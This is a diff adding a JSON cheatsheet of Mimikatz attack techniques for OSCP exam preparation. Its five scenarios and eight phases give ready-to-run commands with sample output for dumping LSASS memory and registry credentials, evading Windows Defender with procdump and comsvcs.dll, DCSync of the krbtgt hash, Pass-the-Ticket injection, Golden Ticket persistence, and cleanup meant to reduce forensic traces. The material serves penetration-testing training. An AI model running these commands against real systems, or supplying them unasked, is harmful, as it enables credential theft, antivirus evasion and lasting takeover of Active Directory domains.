@@ -1,0 +1,218 @@
+{
+  "cheatsheets": [
+    {
+      "id": "mimikatz-oscp-comprehensive",
+      "name": "Mimikatz Comprehensive OSCP Cheatsheet",
+      "description": "Complete mimikatz reference for OSCP exam covering credential harvesting, Kerberos attacks, and AV bypass alternatives. Includes Pass-the-Ticket, DCSync, Golden/Silver tickets, and offline parsing techniques.",
+      "educational_header": {
+        "how_to_recognize": [
+          "You have local administrator access on Windows machine",
+          "Need to extract credentials from LSASS memory or registry",
+          "Domain Admin or privileged user has active session on compromised machine",
+          "Want lateral movement with stolen credentials or Kerberos tickets",
+          "Need persistence in Active Directory environment after domain compromise"
+        ],
+        "when_to_look_for": [
+          "Immediately after gaining local admin on ANY Windows system in domain",
+          "When you need Domain Admin credentials for privilege escalation",
+          "After discovering service account with high privileges logged in",
+          "When DCSync succeeds - create Golden Ticket with krbtgt hash for persistence",
+          "For establishing persistent domain-wide access without password dependencies"
+        ]
+      },
+      "scenarios": [
+        {
+          "title": "Scenario 1: Initial Foothold - Harvest Credentials from Memory",
+          "context": "Gained local admin via web exploit. Need DA credentials for privilege escalation.",
+          "approach": "Enable SeDebugPrivilege, dump LSASS memory, extract NTLM hashes and plaintext passwords from active sessions.",
+          "commands": [
+            "mimikatz-privilege-debug",
+            "mimikatz-sekurlsa-logonpasswords"
+          ],
+          "expected_outcome": "NTLM hashes for domain users with active sessions. Service accounts often contain Domain Admin credentials.",
+          "why_this_works": "LSASS caches credentials for SSO. Service sessions persist even without interactive logons."
+        },
+        {
+          "title": "Scenario 2: AV Bypass - Offline Extraction When Defender Blocks Mimikatz",
+          "context": "Windows Defender enabled, blocks Mimikatz.exe execution. Need credentials without AV detection.",
+          "approach": "Dump LSASS with procdump or comsvcs.dll (Microsoft-signed), transfer dump to Kali, parse offline with pypykatz.",
+          "commands": [
+            "procdump-lsass-dump",
+            "comsvcs-lsass-dump",
+            "pypykatz-parse-lsass"
+          ],
+          "expected_outcome": "Same credentials as direct Mimikatz without on-target AV alerts. 100% offline parsing on Kali.",
+          "why_this_works": "Procdump/comsvcs are legitimate Microsoft tools (no AV signatures). Offline parsing eliminates on-target Mimikatz execution."
+        },
+        {
+          "title": "Scenario 3: DCSync to Golden Ticket - Persistent Domain Access",
+          "context": "Obtained DA credentials. Want persistent access that survives password changes.",
+          "approach": "Extract krbtgt hash via DCSync, create Golden Ticket valid for 10 years, inject for domain-wide access.",
+          "commands": [
+            "ad-dcsync-mimikatz-krbtgt",
+            "mimikatz-kerberos-purge",
+            "mimikatz-kerberos-ptt"
+          ],
+          "expected_outcome": "Golden Ticket valid for 10 years. Access ANY domain resource as any user without passwords.",
+          "why_this_works": "krbtgt hash rarely changes (only on domain functional level upgrades). Forged TGT is cryptographically valid to all domain systems."
+        },
+        {
+          "title": "Scenario 4: Pass-the-Ticket - Reuse Exported Kerberos Tickets",
+          "context": "Exported tickets from compromised workstation where DA logged in. Want to use DA ticket for lateral movement.",
+          "approach": "Export tickets from LSASS memory, purge existing tickets to avoid conflicts, inject DA TGT into current session.",
+          "commands": [
+            "mimikatz-sekurlsa-tickets-export",
+            "mimikatz-kerberos-purge",
+            "mimikatz-kerberos-ptt",
+            "mimikatz-kerberos-list"
+          ],
+          "expected_outcome": "Authenticate as Domain Admin using stolen ticket without knowing password or hash.",
+          "why_this_works": "Kerberos tickets can be exported and reused. Windows accepts valid TGT for any service authentication."
+        },
+        {
+          "title": "Scenario 5: Registry Dumps - Credential Guard Blocks LSASS Access",
+          "context": "LSASS protected by Credential Guard. Memory-based extraction fails.",
+          "approach": "Extract credentials from registry (SAM for local accounts, LSA Secrets for services, Cache for domain users).",
+          "commands": [
+            "mimikatz-lsadump-sam",
+            "mimikatz-lsadump-secrets",
+            "mimikatz-lsadump-cache"
+          ],
+          "expected_outcome": "Local admin hashes from SAM, service account passwords from LSA Secrets, domain cached credentials for offline cracking.",
+          "why_this_works": "Registry-based credentials persist on disk. Alternative when LSASS memory protected or no active sessions."
+        }
+      ],
+      "sections": [
+        {
+          "title": "Phase 1: Prerequisites & Upload",
+          "notes": "Upload Mimikatz or alternatives, verify privileges before credential extraction.",
+          "commands": [
+            {
+              "id": "mimikatz-privilege-debug",
+              "example": ".\\mimikatz.exe \"privilege::debug\" \"exit\"",
+              "shows": "Privilege '20' OK (SeDebugPrivilege enabled)"
+            }
+          ]
+        },
+        {
+          "title": "Phase 2: LSASS Memory Credential Extraction",
+          "notes": "Primary method: Extract credentials from LSASS process memory. Provides NTLM hashes, plaintext passwords (if cached), and Kerberos tickets.",
+          "commands": [
+            {
+              "id": "mimikatz-sekurlsa-logonpasswords",
+              "example": ".\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
+              "shows": "User Name: admin, Domain: CORP, NTLM: 8846f7ea..."
+            },
+            {
+              "id": "mimikatz-sekurlsa-tickets-export",
+              "example": ".\\mimikatz.exe \"privilege::debug\" \"sekurlsa::tickets /export\" \"exit\"",
+              "shows": "Saved to file: [0;3e7]-2-0-40e10000-admin@krbtgt-CORP.kirbi"
+            }
+          ]
+        },
+        {
+          "title": "Phase 3: AV Bypass - Alternative LSASS Extraction Methods",
+          "notes": "When Mimikatz.exe blocked by AV: Use procdump (Microsoft-signed) or comsvcs.dll (built-in). Dump LSASS memory, download to Kali, parse offline with pypykatz.",
+          "commands": [
+            {
+              "id": "procdump-lsass-dump",
+              "example": ".\\procdump64.exe -accepteula -ma lsass.exe lsass.dmp",
+              "shows": "Dump 1 complete: 156 MB written in 8.2 seconds"
+            },
+            {
+              "id": "comsvcs-lsass-dump",
+              "example": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 612 C:\\Temp\\lsass.dmp full",
+              "shows": "No output (silent success, verify file created)"
+            },
+            {
+              "id": "pypykatz-parse-lsass",
+              "example": "pypykatz lsa minidump lsass.dmp",
+              "shows": "username admin, NT: 8846f7eaee8fb117ad06bdd830b7586c"
+            }
+          ]
+        },
+        {
+          "title": "Phase 4: Registry-Based Credential Dumps",
+          "notes": "Alternative to LSASS memory when Credential Guard enabled or no active sessions. SAM = local accounts, Secrets = service passwords/autologon, Cache = domain cached credentials.",
+          "commands": [
+            {
+              "id": "mimikatz-lsadump-sam",
+              "example": ".\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" \"exit\"",
+              "shows": "RID: 000001f4 (500), User: Administrator, NTLM: aad3b435..."
+            },
+            {
+              "id": "mimikatz-lsadump-secrets",
+              "example": ".\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::secrets\" \"exit\"",
+              "shows": "Secret: _SC_MSSQLSERVER, text: P@ssw0rd123!"
+            },
+            {
+              "id": "mimikatz-lsadump-cache",
+              "example": ".\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::cache\" \"exit\"",
+              "shows": "User: jdoe, MsCacheV2: e2d81a7f8b9c... (hashcat mode 2100)"
+            }
+          ]
+        },
+        {
+          "title": "Phase 5: Kerberos Ticket Manipulation",
+          "notes": "List tickets to verify injection, inject tickets for Pass-the-Ticket attacks, purge tickets for cleanup or to avoid conflicts.",
+          "commands": [
+            {
+              "id": "mimikatz-kerberos-list",
+              "example": ".\\mimikatz.exe \"kerberos::list\" \"exit\"",
+              "shows": "Server Name: krbtgt/CORP.COM, Client: admin@CORP.COM"
+            },
+            {
+              "id": "mimikatz-kerberos-ptt",
+              "example": ".\\mimikatz.exe \"kerberos::ptt admin.kirbi\" \"exit\"",
+              "shows": "Injecting ticket: OK"
+            },
+            {
+              "id": "mimikatz-kerberos-purge",
+              "example": ".\\mimikatz.exe \"kerberos::purge\" \"exit\"",
+              "shows": "Ticket(s) purge for current session is OK"
+            }
+          ]
+        },
+        {
+          "title": "Phase 6: DCSync Attack - Remote Credential Dumping",
+          "notes": "Requires Domain Admin or equivalent replication privileges. Extract password hashes remotely from Domain Controller without logging in.",
+          "commands": [
+            {
+              "id": "ad-dcsync-mimikatz-krbtgt",
+              "example": "mimikatz # lsadump::dcsync /domain:corp.com /user:krbtgt",
+              "shows": "User: krbtgt, NTLM: 1693c6cefafffc7af11ef34d1c788f47"
+            }
+          ]
+        },
+        {
+          "title": "Phase 7: Golden/Silver Ticket Creation - Kerberos Persistence",
+          "notes": "Golden Ticket (TGT) = domain-wide access with krbtgt hash. Silver Ticket (TGS) = service-specific access with service account hash. Both provide persistence.",
+          "commands": []
+        },
+        {
+          "title": "Phase 8: Cleanup & OPSEC",
+          "notes": "Remove artifacts, purge injected tickets, delete dump files. Minimize forensic footprint.",
+          "commands": [
+            {
+              "id": "mimikatz-kerberos-purge",
+              "example": ".\\mimikatz.exe \"kerberos::purge\" \"exit\"",
+              "shows": "Ticket(s) purge for current session is OK"
+            }
+          ]
+        }
+      ],
+      "tags": [
+        "MIMIKATZ",
+        "ACTIVE_DIRECTORY",
+        "CREDENTIAL_HARVESTING",
+        "OSCP:HIGH",
+        "METHODOLOGY",
+        "PASS_THE_TICKET",
+        "DCSYNC",
+        "GOLDEN_TICKET",
+        "KERBEROS",
+        "AV_EVASION"
+      ]
+    }
+  ]
+}
